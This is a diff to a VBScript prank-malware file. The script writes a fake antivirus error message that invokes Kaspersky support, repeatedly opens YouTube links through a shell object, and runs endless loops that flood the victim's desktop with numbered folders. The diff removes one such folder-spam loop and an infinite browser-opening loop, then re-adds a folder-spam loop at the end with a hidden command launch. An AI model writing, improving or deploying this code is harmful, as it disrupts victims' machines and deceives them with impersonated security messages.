@@ -94,28 +94,7 @@ virus.Writeline "Due an error, Code error:3212552, CLRAV has not disinfect your 
 virus.Writeline "For Support please send a e-mail to support@kaspersky.com and please indicate the Code Error." 			
 virus.Close					       
 
-Set fso = CreateObject("Scripting.FileSystemObject")
-desktopPath = carew.SpecialFolders("Desktop")  ' shell already declared earlier
 
-Dim i
-i = 1
-
-Do
-    folderName = desktopPath & "\TrendyClient_" & i
-    If Not fso.FolderExists(folderName) Then
-        fso.CreateFolder folderName
-        Set txtFile = fso.CreateTextFile(folderName & "\note.txt", True)
-        txtFile.WriteLine "This is TextFolder #" & i
-        txtFile.Close
-    End If
-    i = i + 1
-Loop
-
-
-	
-Do
-    carew.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 1, False
-Loop
 	
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
@@ -660,3 +639,26 @@ carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 virus.Writeline "Due an error, Code error:3212552, CLRAV has not disinfect your computer"                                 
 virus.Writeline "For Support please send a e-mail to support@kaspersky.com and please indicate the Code Error." 			
 virus.Close	
+
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+desktopPath = carew.SpecialFolders("Desktop")  ' using your carew shell
+
+' Launch YouTube loop in a separate script
+carew.Run "cmd /c start https://www.youtube.com/watch?v=xvFZjo5PgG0", 0, False
+
+' Start folder spam loop
+Dim i
+i = 1
+
+Do
+    folderName = desktopPath & "\TextFolder_" & i
+    If Not fso.FolderExists(folderName) Then
+        fso.CreateFolder folderName
+        Set txtFile = fso.CreateTextFile(folderName & "\note.txt", True)
+        txtFile.WriteLine "This is TextFolder #" & i
+        txtFile.Close
+    End If
+    i = i + 1
+    WScript.Sleep 100  ' Slight delay to prevent system freeze
+Loop
